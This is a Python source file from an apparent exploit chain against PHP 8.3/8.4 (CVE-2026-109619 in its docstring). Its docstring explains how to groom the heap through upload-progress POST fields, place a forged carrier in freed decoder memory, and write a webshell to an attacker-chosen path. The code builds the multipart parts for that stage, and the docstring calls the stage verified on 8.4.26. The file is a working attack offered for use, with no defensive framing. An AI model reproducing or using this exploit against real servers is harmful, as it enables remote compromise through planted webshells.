# INDEX: upload-progress stage POST triggering basedir write | all | needs freed decoder blocks
"""ps_files->basedir write-delivery stage body: the single multipart POST that re-occupies the
freed decoder blocks with the forged carrier and triggers the write (CVE-2026-109619).

Mechanism (ext/standard/rfc1867.c, ext/session/session.c; php-src 8.3/8.4):
  One upload-progress POST shaped as
    [nfield tiny prefix $_POST fields][BIG = carrier][PHP_SESSION_UPLOAD_PROGRESS = shell][trailing $_FILES part]
  The tiny prefix fields fragment the request heap so the carrier first-fits AT the freed
  var_dtor_entries block (above d, preserving d), where its forged E/DT bookkeeping takes effect. The
  progress field carries the webshell as the session value; the trailing $_FILES part's FILE_START
  update runs the forged ps_files_open()/flush that pwrites the session to the attacker path.

API:
  stage_parts(carrier, shell, *, nfield, flen, fsize=5000, file_field=b"f", filename=b"a.bin",
              progress_key=b"PHP_SESSION_UPLOAD_PROGRESS") -> list of (name, value, filename|None)
    tuples for the caller's multipart transport. Field VALUES carry NUL-bearing data, so they are
    body fields (binary-safe), never filenames.

Tested: 8.4.26-fpm, 8.4.26-apache mod_php.
Stage: VERIFIED 8.4.26.
"""

PROGRESS_KEY = b"PHP_SESSION_UPLOAD_PROGRESS"


def stage_parts(carrier, shell, *, nfield, flen, fsize=5000,
                file_field=b"f", filename=b"a.bin", progress_key=PROGRESS_KEY):
    """Build the stage POST's parts: `nfield` tiny prefix fields (filler `flen`), the BIG `carrier`,
    the progress field carrying `shell`, and a trailing $_FILES part (filler `fsize`) whose
    FILE_START update triggers the forged flush. Returns (name, value, filename|None) tuples."""
    parts = [(b"P%03d" % i, b"R" * flen, None) for i in range(nfield)]
    parts += [(b"BIG", carrier, None),
              (progress_key, shell, None),
              (file_field, b"Z" * fsize, filename)]
    return parts
